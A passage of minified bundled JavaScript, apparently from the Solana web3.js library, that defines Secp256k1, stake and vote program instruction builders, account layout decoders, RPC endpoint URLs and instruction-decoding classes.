            ethAddressInstructionIndex: i,
            messageDataOffset: u,
            messageDataSize: n.length,
            messageInstructionIndex: i,
            signature: Ki(r),
            ethAddress: Ki(s),
            recoveryId: o,
          },
          c
        ),
        c.fill(Ki(n), ec.span),
        new ws({ keys: [], programId: nc.programId, data: c })
      );
    }
    static createInstructionWithPrivateKey(t) {
      const { privateKey: e, message: n, instructionIndex: r } = t;
      us(
        32 === e.length,
        `Private key must be 32 bytes but received ${e.length} bytes`
      );
      try {
        const t = Ki(e),
          o = tc(t, !1).slice(1),
          i = lt.from(hi(Ki(n))),
          [s, a] = ((t, e) => {
            const n = Li.sign(t, e);
            return [n.toCompactRawBytes(), n.recovery];
          })(i, t);
        return this.createInstructionWithPublicKey({
          publicKey: o,
          message: n,
          signature: s,
          recoveryId: a,
          instructionIndex: r,
        });
      } catch (o) {
        throw new Error(`Error creating instruction; ${o}`);
      }
    }
  }
  var rc;
  nc.programId = new Xi("KeccakSecp256k11111111111111111111111111111");
  const oc = new Xi("StakeConfig11111111111111111111111111111111");
  class ic {
    constructor(t, e) {
      (this.staker = void 0),
        (this.withdrawer = void 0),
        (this.staker = t),
        (this.withdrawer = e);
    }
  }
  class sc {
    constructor(t, e, n) {
      (this.unixTimestamp = void 0),
        (this.epoch = void 0),
        (this.custodian = void 0),
        (this.unixTimestamp = t),
        (this.epoch = e),
        (this.custodian = n);
    }
  }
  (rc = sc), (sc.default = new rc(0, 0, Xi.default));
  const ac = Object.freeze({
      Initialize: {
        index: 0,
        layout: Cr.struct([
          Cr.u32("instruction"),
          ((t = "authorized") =>
            Cr.struct([ns("staker"), ns("withdrawer")], t))(),
          ((t = "lockup") =>
            Cr.struct(
              [Cr.ns64("unixTimestamp"), Cr.ns64("epoch"), ns("custodian")],
              t
            ))(),
        ]),
      },
      Authorize: {
        index: 1,
        layout: Cr.struct([
          Cr.u32("instruction"),
          ns("newAuthorized"),
          Cr.u32("stakeAuthorizationType"),
        ]),
      },
      Delegate: { index: 2, layout: Cr.struct([Cr.u32("instruction")]) },
      Split: {
        index: 3,
        layout: Cr.struct([Cr.u32("instruction"), Cr.ns64("lamports")]),
      },
      Withdraw: {
        index: 4,
        layout: Cr.struct([Cr.u32("instruction"), Cr.ns64("lamports")]),
      },
      Deactivate: { index: 5, layout: Cr.struct([Cr.u32("instruction")]) },
      Merge: { index: 7, layout: Cr.struct([Cr.u32("instruction")]) },
      AuthorizeWithSeed: {
        index: 8,
        layout: Cr.struct([
          Cr.u32("instruction"),
          ns("newAuthorized"),
          Cr.u32("stakeAuthorizationType"),
          os("authoritySeed"),
          ns("authorityOwner"),
        ]),
      },
    }),
    uc = Object.freeze({ Staker: { index: 0 }, Withdrawer: { index: 1 } });
  class cc {
    constructor() {}
    static initialize(t) {
      const { stakePubkey: e, authorized: n, lockup: r } = t,
        o = r || sc.default,
        i = Ls(ac.Initialize, {
          authorized: {
            staker: Ki(n.staker.toBuffer()),
            withdrawer: Ki(n.withdrawer.toBuffer()),
          },
          lockup: {
            unixTimestamp: o.unixTimestamp,
            epoch: o.epoch,
            custodian: Ki(o.custodian.toBuffer()),
          },
        }),
        s = {
          keys: [
            { pubkey: e, isSigner: !1, isWritable: !0 },
            { pubkey: Ts, isSigner: !1, isWritable: !1 },
          ],
          programId: this.programId,
          data: i,
        };
      return new ws(s);
    }
    static createAccountWithSeed(t) {
      const e = new bs();
      e.add(
        Fs.createAccountWithSeed({
          fromPubkey: t.fromPubkey,
          newAccountPubkey: t.stakePubkey,
          basePubkey: t.basePubkey,
          seed: t.seed,
          lamports: t.lamports,
          space: this.space,
          programId: this.programId,
        })
      );
      const { stakePubkey: n, authorized: r, lockup: o } = t;
      return e.add(
        this.initialize({ stakePubkey: n, authorized: r, lockup: o })
      );
    }
    static createAccount(t) {
      const e = new bs();
      e.add(
        Fs.createAccount({
          fromPubkey: t.fromPubkey,
          newAccountPubkey: t.stakePubkey,
          lamports: t.lamports,
          space: this.space,
          programId: this.programId,
        })
      );
      const { stakePubkey: n, authorized: r, lockup: o } = t;
      return e.add(
        this.initialize({ stakePubkey: n, authorized: r, lockup: o })
      );
    }
    static delegate(t) {
      const { stakePubkey: e, authorizedPubkey: n, votePubkey: r } = t,
        o = Ls(ac.Delegate);
      return new bs().add({
        keys: [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: r, isSigner: !1, isWritable: !1 },
          { pubkey: ks, isSigner: !1, isWritable: !1 },
          { pubkey: xs, isSigner: !1, isWritable: !1 },
          { pubkey: oc, isSigner: !1, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: o,
      });
    }
    static authorize(t) {
      const {
          stakePubkey: e,
          authorizedPubkey: n,
          newAuthorizedPubkey: r,
          stakeAuthorizationType: o,
          custodianPubkey: i,
        } = t,
        s = Ls(ac.Authorize, {
          newAuthorized: Ki(r.toBuffer()),
          stakeAuthorizationType: o.index,
        }),
        a = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: ks, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return (
        i && a.push({ pubkey: i, isSigner: !0, isWritable: !1 }),
        new bs().add({ keys: a, programId: this.programId, data: s })
      );
    }
    static authorizeWithSeed(t) {
      const {
          stakePubkey: e,
          authorityBase: n,
          authoritySeed: r,
          authorityOwner: o,
          newAuthorizedPubkey: i,
          stakeAuthorizationType: s,
          custodianPubkey: a,
        } = t,
        u = Ls(ac.AuthorizeWithSeed, {
          newAuthorized: Ki(i.toBuffer()),
          stakeAuthorizationType: s.index,
          authoritySeed: r,
          authorityOwner: Ki(o.toBuffer()),
        }),
        c = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
          { pubkey: ks, isSigner: !1, isWritable: !1 },
        ];
      return (
        a && c.push({ pubkey: a, isSigner: !0, isWritable: !1 }),
        new bs().add({ keys: c, programId: this.programId, data: u })
      );
    }
    static splitInstruction(t) {
      const {
          stakePubkey: e,
          authorizedPubkey: n,
          splitStakePubkey: r,
          lamports: o,
        } = t,
        i = Ls(ac.Split, { lamports: o });
      return new ws({
        keys: [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: r, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: i,
      });
    }
    static split(t, e) {
      const n = new bs();
      return (
        n.add(
          Fs.createAccount({
            fromPubkey: t.authorizedPubkey,
            newAccountPubkey: t.splitStakePubkey,
            lamports: e,
            space: this.space,
            programId: this.programId,
          })
        ),
        n.add(this.splitInstruction(t))
      );
    }
    static splitWithSeed(t, e) {
      const {
          stakePubkey: n,
          authorizedPubkey: r,
          splitStakePubkey: o,
          basePubkey: i,
          seed: s,
          lamports: a,
        } = t,
        u = new bs();
      return (
        u.add(
          Fs.allocate({
            accountPubkey: o,
            basePubkey: i,
            seed: s,
            space: this.space,
            programId: this.programId,
          })
        ),
        e &&
          e > 0 &&
          u.add(
            Fs.transfer({
              fromPubkey: t.authorizedPubkey,
              toPubkey: o,
              lamports: e,
            })
          ),
        u.add(
          this.splitInstruction({
            stakePubkey: n,
            authorizedPubkey: r,
            splitStakePubkey: o,
            lamports: a,
          })
        )
      );
    }
    static merge(t) {
      const { stakePubkey: e, sourceStakePubKey: n, authorizedPubkey: r } = t,
        o = Ls(ac.Merge);
      return new bs().add({
        keys: [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !1, isWritable: !0 },
          { pubkey: ks, isSigner: !1, isWritable: !1 },
          { pubkey: xs, isSigner: !1, isWritable: !1 },
          { pubkey: r, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: o,
      });
    }
    static withdraw(t) {
      const {
          stakePubkey: e,
          authorizedPubkey: n,
          toPubkey: r,
          lamports: o,
          custodianPubkey: i,
        } = t,
        s = Ls(ac.Withdraw, { lamports: o }),
        a = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: r, isSigner: !1, isWritable: !0 },
          { pubkey: ks, isSigner: !1, isWritable: !1 },
          { pubkey: xs, isSigner: !1, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return (
        i && a.push({ pubkey: i, isSigner: !0, isWritable: !1 }),
        new bs().add({ keys: a, programId: this.programId, data: s })
      );
    }
    static deactivate(t) {
      const { stakePubkey: e, authorizedPubkey: n } = t,
        r = Ls(ac.Deactivate);
      return new bs().add({
        keys: [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: ks, isSigner: !1, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: r,
      });
    }
  }
  (cc.programId = new Xi("Stake11111111111111111111111111111111111111")),
    (cc.space = 200);
  class lc {
    constructor(t, e, n, r) {
      (this.nodePubkey = void 0),
        (this.authorizedVoter = void 0),
        (this.authorizedWithdrawer = void 0),
        (this.commission = void 0),
        (this.nodePubkey = t),
        (this.authorizedVoter = e),
        (this.authorizedWithdrawer = n),
        (this.commission = r);
    }
  }
  const dc = Object.freeze({
      InitializeAccount: {
        index: 0,
        layout: Cr.struct([
          Cr.u32("instruction"),
          ((t = "voteInit") =>
            Cr.struct(
              [
                ns("nodePubkey"),
                ns("authorizedVoter"),
                ns("authorizedWithdrawer"),
                Cr.u8("commission"),
              ],
              t
            ))(),
        ]),
      },
      Authorize: {
        index: 1,
        layout: Cr.struct([
          Cr.u32("instruction"),
          ns("newAuthorized"),
          Cr.u32("voteAuthorizationType"),
        ]),
      },
      Withdraw: {
        index: 3,
        layout: Cr.struct([Cr.u32("instruction"), Cr.ns64("lamports")]),
      },
      UpdateValidatorIdentity: {
        index: 4,
        layout: Cr.struct([Cr.u32("instruction")]),
      },
      AuthorizeWithSeed: {
        index: 10,
        layout: Cr.struct([
          Cr.u32("instruction"),
          ((t = "voteAuthorizeWithSeedArgs") =>
            Cr.struct(
              [
                Cr.u32("voteAuthorizationType"),
                ns("currentAuthorityDerivedKeyOwnerPubkey"),
                os("currentAuthorityDerivedKeySeed"),
                ns("newAuthorized"),
              ],
              t
            ))(),
        ]),
      },
    }),
    fc = Object.freeze({ Voter: { index: 0 }, Withdrawer: { index: 1 } });
  class hc {
    constructor() {}
    static initializeAccount(t) {
      const { votePubkey: e, nodePubkey: n, voteInit: r } = t,
        o = Ls(dc.InitializeAccount, {
          voteInit: {
            nodePubkey: Ki(r.nodePubkey.toBuffer()),
            authorizedVoter: Ki(r.authorizedVoter.toBuffer()),
            authorizedWithdrawer: Ki(r.authorizedWithdrawer.toBuffer()),
            commission: r.commission,
          },
        }),
        i = {
          keys: [
            { pubkey: e, isSigner: !1, isWritable: !0 },
            { pubkey: Ts, isSigner: !1, isWritable: !1 },
            { pubkey: ks, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !0, isWritable: !1 },
          ],
          programId: this.programId,
          data: o,
        };
      return new ws(i);
    }
    static createAccount(t) {
      const e = new bs();
      return (
        e.add(
          Fs.createAccount({
            fromPubkey: t.fromPubkey,
            newAccountPubkey: t.votePubkey,
            lamports: t.lamports,
            space: this.space,
            programId: this.programId,
          })
        ),
        e.add(
          this.initializeAccount({
            votePubkey: t.votePubkey,
            nodePubkey: t.voteInit.nodePubkey,
            voteInit: t.voteInit,
          })
        )
      );
    }
    static authorize(t) {
      const {
          votePubkey: e,
          authorizedPubkey: n,
          newAuthorizedPubkey: r,
          voteAuthorizationType: o,
        } = t,
        i = Ls(dc.Authorize, {
          newAuthorized: Ki(r.toBuffer()),
          voteAuthorizationType: o.index,
        }),
        s = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: ks, isSigner: !1, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return new bs().add({ keys: s, programId: this.programId, data: i });
    }
    static authorizeWithSeed(t) {
      const {
          currentAuthorityDerivedKeyBasePubkey: e,
          currentAuthorityDerivedKeyOwnerPubkey: n,
          currentAuthorityDerivedKeySeed: r,
          newAuthorizedPubkey: o,
          voteAuthorizationType: i,
          votePubkey: s,
        } = t,
        a = Ls(dc.AuthorizeWithSeed, {
          voteAuthorizeWithSeedArgs: {
            currentAuthorityDerivedKeyOwnerPubkey: Ki(n.toBuffer()),
            currentAuthorityDerivedKeySeed: r,
            newAuthorized: Ki(o.toBuffer()),
            voteAuthorizationType: i.index,
          },
        }),
        u = [
          { pubkey: s, isSigner: !1, isWritable: !0 },
          { pubkey: ks, isSigner: !1, isWritable: !1 },
          { pubkey: e, isSigner: !0, isWritable: !1 },
        ];
      return new bs().add({ keys: u, programId: this.programId, data: a });
    }
    static withdraw(t) {
      const {
          votePubkey: e,
          authorizedWithdrawerPubkey: n,
          lamports: r,
          toPubkey: o,
        } = t,
        i = Ls(dc.Withdraw, { lamports: r }),
        s = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: o, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return new bs().add({ keys: s, programId: this.programId, data: i });
    }
    static safeWithdraw(t, e, n) {
      if (t.lamports > e - n)
        throw new Error(
          "Withdraw will leave vote account with insufficient funds."
        );
      return hc.withdraw(t);
    }
    static updateValidatorIdentity(t) {
      const { votePubkey: e, authorizedWithdrawerPubkey: n, nodePubkey: r } = t,
        o = Ls(dc.UpdateValidatorIdentity),
        i = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: r, isSigner: !0, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return new bs().add({ keys: i, programId: this.programId, data: o });
    }
  }
  (hc.programId = new Xi("Vote111111111111111111111111111111111111111")),
    (hc.space = 3762);
  const pc = new Xi("Va1idator1nfo111111111111111111111111111111"),
    mc = ao({
      name: io(),
      website: ro(io()),
      details: ro(io()),
      iconUrl: ro(io()),
      keybaseUsername: ro(io()),
    });
  class gc {
    constructor(t, e) {
      (this.key = void 0),
        (this.info = void 0),
        (this.key = t),
        (this.info = e);
    }
    static fromConfigData(t) {
      let e = [...t];
      if (2 !== ss(e)) return null;
      const n = [];
      for (let r = 0; r < 2; r++) {
        const t = new Xi(fs(e, 0, Vi)),
          r = 1 === ds(e);
        n.push({ publicKey: t, isSigner: r });
      }
      if (n[0].publicKey.equals(pc) && n[1].isSigner) {
        const t = os().decode(lt.from(e)),
          r = JSON.parse(t);
        return Vr(r, mc), new gc(n[1].publicKey, r);
      }
      return null;
    }
  }
  const yc = new Xi("Vote111111111111111111111111111111111111111"),
    wc = Cr.struct([
      ns("nodePubkey"),
      ns("authorizedWithdrawer"),
      Cr.u8("commission"),
      Cr.nu64(),
      Cr.seq(
        Cr.struct([Cr.nu64("slot"), Cr.u32("confirmationCount")]),
        Cr.offset(Cr.u32(), -8),
        "votes"
      ),
      Cr.u8("rootSlotValid"),
      Cr.nu64("rootSlot"),
      Cr.nu64(),
      Cr.seq(
        Cr.struct([Cr.nu64("epoch"), ns("authorizedVoter")]),
        Cr.offset(Cr.u32(), -8),
        "authorizedVoters"
      ),
      Cr.struct(
        [
          Cr.seq(
            Cr.struct([
              ns("authorizedPubkey"),
              Cr.nu64("epochOfLastAuthorizedSwitch"),
              Cr.nu64("targetEpoch"),
            ]),
            32,
            "buf"
          ),
          Cr.nu64("idx"),
          Cr.u8("isEmpty"),
        ],
        "priorVoters"
      ),
      Cr.nu64(),
      Cr.seq(
        Cr.struct([
          Cr.nu64("epoch"),
          Cr.nu64("credits"),
          Cr.nu64("prevCredits"),
        ]),
        Cr.offset(Cr.u32(), -8),
        "epochCredits"
      ),
      Cr.struct([Cr.nu64("slot"), Cr.nu64("timestamp")], "lastTimestamp"),
    ]);
  class bc {
    constructor(t) {
      (this.nodePubkey = void 0),
        (this.authorizedWithdrawer = void 0),
        (this.commission = void 0),
        (this.rootSlot = void 0),
        (this.votes = void 0),
        (this.authorizedVoters = void 0),
        (this.priorVoters = void 0),
        (this.epochCredits = void 0),
        (this.lastTimestamp = void 0),
        (this.nodePubkey = t.nodePubkey),
        (this.authorizedWithdrawer = t.authorizedWithdrawer),
        (this.commission = t.commission),
        (this.rootSlot = t.rootSlot),
        (this.votes = t.votes),
        (this.authorizedVoters = t.authorizedVoters),
        (this.priorVoters = t.priorVoters),
        (this.epochCredits = t.epochCredits),
        (this.lastTimestamp = t.lastTimestamp);
    }
    static fromAccountData(t) {
      const e = wc.decode(Ki(t), 4);
      let n = e.rootSlot;
      return (
        e.rootSlotValid || (n = null),
        new bc({
          nodePubkey: new Xi(e.nodePubkey),
          authorizedWithdrawer: new Xi(e.authorizedWithdrawer),
          commission: e.commission,
          votes: e.votes,
          rootSlot: n,
          authorizedVoters: e.authorizedVoters.map(vc),
          priorVoters: kc(e.priorVoters),
          epochCredits: e.epochCredits,
          lastTimestamp: e.lastTimestamp,
        })
      );
    }
  }
  function vc({ authorizedVoter: t, epoch: e }) {
    return { epoch: e, authorizedVoter: new Xi(t) };
  }
  function Ac({
    authorizedPubkey: t,
    epochOfLastAuthorizedSwitch: e,
    targetEpoch: n,
  }) {
    return {
      authorizedPubkey: new Xi(t),
      epochOfLastAuthorizedSwitch: e,
      targetEpoch: n,
    };
  }
  function kc({ buf: t, idx: e, isEmpty: n }) {
    return n ? [] : [...t.slice(e + 1).map(Ac), ...t.slice(0, e).map(Ac)];
  }
  const Ic = {
    http: {
      devnet: "http://api.devnet.solana.com",
      testnet: "http://api.testnet.solana.com",
      "mainnet-beta": "http://api.mainnet-beta.solana.com/",
    },
    https: {
      devnet: "https://api.devnet.solana.com",
      testnet: "https://api.testnet.solana.com",
      "mainnet-beta": "https://api.mainnet-beta.solana.com/",
    },
  };
  const Sc = Object.freeze(
    Object.defineProperty(
      {
        __proto__: null,
        Account: class {
          constructor(t) {
            if (((this._publicKey = void 0), (this._secretKey = void 0), t)) {
              const e = Ki(t);
              if (64 !== t.length) throw new Error("bad secret key size");
              (this._publicKey = e.slice(32, 64)),
                (this._secretKey = e.slice(0, 32));
            } else
              (this._secretKey = Ki(Ni())),
                (this._publicKey = Ki(Ui(this._secretKey)));
          }
          get publicKey() {
            return new Xi(this._publicKey);
          }
          get secretKey() {
            return lt.concat([this._secretKey, this._publicKey], 64);
          }
        },
        AddressLookupTableAccount: ta,
        AddressLookupTableInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Cr.u32("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(Xu))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Invalid Instruction. Should be a LookupTable Instruction"
              );
            return n;
          }
          static decodeCreateLookupTable(t) {
            this.checkProgramId(t.programId), this.checkKeysLength(t.keys, 4);
            const { recentSlot: e } = Ns(Xu.CreateLookupTable, t.data);
            return {
              authority: t.keys[1].pubkey,
              payer: t.keys[2].pubkey,
              recentSlot: Number(e),
            };
          }
          static decodeExtendLookupTable(t) {
            if ((this.checkProgramId(t.programId), t.keys.length < 2))
              throw new Error(
                `invalid instruction; found ${t.keys.length} keys, expected at least 2`
              );
            const { addresses: e } = Ns(Xu.ExtendLookupTable, t.data);
            return {
              lookupTable: t.keys[0].pubkey,
              authority: t.keys[1].pubkey,
              payer: t.keys.length > 2 ? t.keys[2].pubkey : void 0,
              addresses: e.map((t) => new Xi(t)),
            };
          }
          static decodeCloseLookupTable(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeysLength(t.keys, 3),
              {
                lookupTable: t.keys[0].pubkey,
                authority: t.keys[1].pubkey,
                recipient: t.keys[2].pubkey,
              }
            );
          }
          static decodeFreezeLookupTable(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeysLength(t.keys, 2),
              { lookupTable: t.keys[0].pubkey, authority: t.keys[1].pubkey }
            );
          }
          static decodeDeactivateLookupTable(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeysLength(t.keys, 2),
              { lookupTable: t.keys[0].pubkey, authority: t.keys[1].pubkey }
            );
          }
          static checkProgramId(t) {
            if (!t.equals(Zu.programId))
              throw new Error(
                "invalid instruction; programId is not AddressLookupTable Program"
              );
          }
          static checkKeysLength(t, e) {
            if (t.length < e)
              throw new Error(
                `invalid instruction; found ${t.length} keys, expected at least ${e}`
              );
          }
        },
        AddressLookupTableProgram: Zu,
        Authorized: ic,
        BLOCKHASH_CACHE_TIMEOUT_MS: 3e4,
        BPF_LOADER_DEPRECATED_PROGRAM_ID: Zi,
        BPF_LOADER_PROGRAM_ID: Gs,
        BpfLoader: class {
          static getMinNumSignatures(t) {
            return js.getMinNumSignatures(t);
          }
          static load(t, e, n, r, o) {
            return js.load(t, e, n, o, r);
          }
        },
        COMPUTE_BUDGET_INSTRUCTION_LAYOUTS: Ju,
        ComputeBudgetInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Cr.u8("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(Ju))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Instruction type incorrect; not a ComputeBudgetInstruction"
              );
            return n;
          }
          static decodeRequestUnits(t) {
            this.checkProgramId(t.programId);
            const { units: e, additionalFee: n } = Ns(Ju.RequestUnits, t.data);
            return { units: e, additionalFee: n };
          }
          static decodeRequestHeapFrame(t) {
            this.checkProgramId(t.programId);
            const { bytes: e } = Ns(Ju.RequestHeapFrame, t.data);
            return { bytes: e };
          }
          static decodeSetComputeUnitLimit(t) {
            this.checkProgramId(t.programId);
            const { units: e } = Ns(Ju.SetComputeUnitLimit, t.data);
            return { units: e };
          }
          static decodeSetComputeUnitPrice(t) {
            this.checkProgramId(t.programId);
            const { microLamports: e } = Ns(Ju.SetComputeUnitPrice, t.data);
            return { microLamports: e };
          }
          static checkProgramId(t) {
            if (!t.equals(Yu.programId))
              throw new Error(
                "invalid instruction; programId is not ComputeBudgetProgram"
              );
          }
        },
        ComputeBudgetProgram: Yu,
        Connection: Vu,
        Ed25519Program: $u,
        Enum: class extends Fi {
          constructor(t) {
            if ((super(t), (this.enum = ""), 1 !== Object.keys(t).length))
              throw new Error("Enum can only take single value");
            Object.keys(t).map((t) => {
              this.enum = t;
            });
          }
        },
        EpochSchedule: Ys,
        FeeCalculatorLayout: Ds,
        Keypair: Hu,
        LAMPORTS_PER_SOL: 1e9,
        LOOKUP_TABLE_INSTRUCTION_LAYOUTS: Xu,
        Loader: js,
        Lockup: sc,
        MAX_SEED_LENGTH: 32,
        Message: hs,
        MessageAccountKeys: es,
        MessageV0: ps,
        NONCE_ACCOUNT_LENGTH: qs,
        NonceAccount: Ws,
        PACKET_DATA_SIZE: Ji,
        PUBLIC_KEY_LENGTH: Vi,
        PublicKey: Xi,
        SIGNATURE_LENGTH_IN_BYTES: 64,
        SOLANA_SCHEMA: ji,
        STAKE_CONFIG_ID: oc,
        STAKE_INSTRUCTION_LAYOUTS: ac,
        SYSTEM_INSTRUCTION_LAYOUTS: Ks,
        SYSVAR_CLOCK_PUBKEY: ks,
        SYSVAR_EPOCH_SCHEDULE_PUBKEY: Is,
        SYSVAR_INSTRUCTIONS_PUBKEY: Ss,
        SYSVAR_RECENT_BLOCKHASHES_PUBKEY: _s,
        SYSVAR_RENT_PUBKEY: Ts,
        SYSVAR_REWARDS_PUBKEY: Cs,
        SYSVAR_SLOT_HASHES_PUBKEY: Bs,
        SYSVAR_SLOT_HISTORY_PUBKEY: Es,
        SYSVAR_STAKE_HISTORY_PUBKEY: xs,
        Secp256k1Program: nc,
        SendTransactionError: Ps,
        SolanaJSONRPCError: Rs,
        SolanaJSONRPCErrorCode: {
          JSON_RPC_SERVER_ERROR_BLOCK_CLEANED_UP: -32001,
          JSON_RPC_SERVER_ERROR_SEND_TRANSACTION_PREFLIGHT_FAILURE: -32002,
          JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_VERIFICATION_FAILURE:
            -32003,
          JSON_RPC_SERVER_ERROR_BLOCK_NOT_AVAILABLE: -32004,
          JSON_RPC_SERVER_ERROR_NODE_UNHEALTHY: -32005,
          JSON_RPC_SERVER_ERROR_TRANSACTION_PRECOMPILE_VERIFICATION_FAILURE:
            -32006,
          JSON_RPC_SERVER_ERROR_SLOT_SKIPPED: -32007,
          JSON_RPC_SERVER_ERROR_NO_SNAPSHOT: -32008,
          JSON_RPC_SERVER_ERROR_LONG_TERM_STORAGE_SLOT_SKIPPED: -32009,
          JSON_RPC_SERVER_ERROR_KEY_EXCLUDED_FROM_SECONDARY_INDEX: -32010,
          JSON_RPC_SERVER_ERROR_TRANSACTION_HISTORY_NOT_AVAILABLE: -32011,
          JSON_RPC_SCAN_ERROR: -32012,
          JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_LEN_MISMATCH: -32013,
          JSON_RPC_SERVER_ERROR_BLOCK_STATUS_NOT_AVAILABLE_YET: -32014,
          JSON_RPC_SERVER_ERROR_UNSUPPORTED_TRANSACTION_VERSION: -32015,
          JSON_RPC_SERVER_ERROR_MIN_CONTEXT_SLOT_NOT_REACHED: -32016,
        },
        StakeAuthorizationLayout: uc,
        StakeInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Cr.u32("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(ac))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Instruction type incorrect; not a StakeInstruction"
              );
            return n;
          }
          static decodeInitialize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const { authorized: e, lockup: n } = Ns(ac.Initialize, t.data);
            return {
              stakePubkey: t.keys[0].pubkey,
              authorized: new ic(new Xi(e.staker), new Xi(e.withdrawer)),
              lockup: new sc(n.unixTimestamp, n.epoch, new Xi(n.custodian)),
            };
          }
          static decodeDelegate(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeyLength(t.keys, 6),
              Ns(ac.Delegate, t.data),
              {
                stakePubkey: t.keys[0].pubkey,
                votePubkey: t.keys[1].pubkey,
                authorizedPubkey: t.keys[5].pubkey,
              }
            );
          }
          static decodeAuthorize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { newAuthorized: e, stakeAuthorizationType: n } = Ns(
                ac.Authorize,
                t.data
              ),
              r = {
                stakePubkey: t.keys[0].pubkey,
                authorizedPubkey: t.keys[2].pubkey,
                newAuthorizedPubkey: new Xi(e),
                stakeAuthorizationType: { index: n },
              };
            return (
              t.keys.length > 3 && (r.custodianPubkey = t.keys[3].pubkey), r
            );
          }
          static decodeAuthorizeWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const {
                newAuthorized: e,
                stakeAuthorizationType: n,
                authoritySeed: r,
                authorityOwner: o,
              } = Ns(ac.AuthorizeWithSeed, t.data),
              i = {
                stakePubkey: t.keys[0].pubkey,
                authorityBase: t.keys[1].pubkey,
                authoritySeed: r,
                authorityOwner: new Xi(o),
                newAuthorizedPubkey: new Xi(e),
                stakeAuthorizationType: { index: n },
              };
            return (
              t.keys.length > 3 && (i.custodianPubkey = t.keys[3].pubkey), i
            );
          }
          static decodeSplit(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { lamports: e } = Ns(ac.Split, t.data);
            return {
              stakePubkey: t.keys[0].pubkey,
              splitStakePubkey: t.keys[1].pubkey,
              authorizedPubkey: t.keys[2].pubkey,
              lamports: e,
            };
          }
          static decodeMerge(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeyLength(t.keys, 3),
              Ns(ac.Merge, t.data),
              {
                stakePubkey: t.keys[0].pubkey,
                sourceStakePubKey: t.keys[1].pubkey,
                authorizedPubkey: t.keys[4].pubkey,
              }
            );
          }
          static decodeWithdraw(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 5);
            const { lamports: e } = Ns(ac.Withdraw, t.data),
              n = {
                stakePubkey: t.keys[0].pubkey,
                toPubkey: t.keys[1].pubkey,
                authorizedPubkey: t.keys[4].pubkey,
                lamports: e,
              };
            return (
              t.keys.length > 5 && (n.custodianPubkey = t.keys[5].pubkey), n
            );
          }
          static decodeDeactivate(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeyLength(t.keys, 3),
              Ns(ac.Deactivate, t.data),
              {
                stakePubkey: t.keys[0].pubkey,
                authorizedPubkey: t.keys[2].pubkey,
              }
            );
          }
          static checkProgramId(t) {
            if (!t.equals(cc.programId))
              throw new Error(
                "invalid instruction; programId is not StakeProgram"
              );
          }
          static checkKeyLength(t, e) {
            if (t.length < e)
              throw new Error(
                `invalid instruction; found ${t.length} keys, expected at least ${e}`
              );
          }
        },
        StakeProgram: cc,
        Struct: Fi,
        SystemInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Cr.u32("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(Ks))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Instruction type incorrect; not a SystemInstruction"
              );
            return n;
          }
          static decodeCreateAccount(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const {
              lamports: e,
              space: n,
              programId: r,
            } = Ns(Ks.Create, t.data);
            return {
              fromPubkey: t.keys[0].pubkey,
              newAccountPubkey: t.keys[1].pubkey,
              lamports: e,
              space: n,
              programId: new Xi(r),
            };
          }
          static decodeTransfer(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const { lamports: e } = Ns(Ks.Transfer, t.data);
            return {
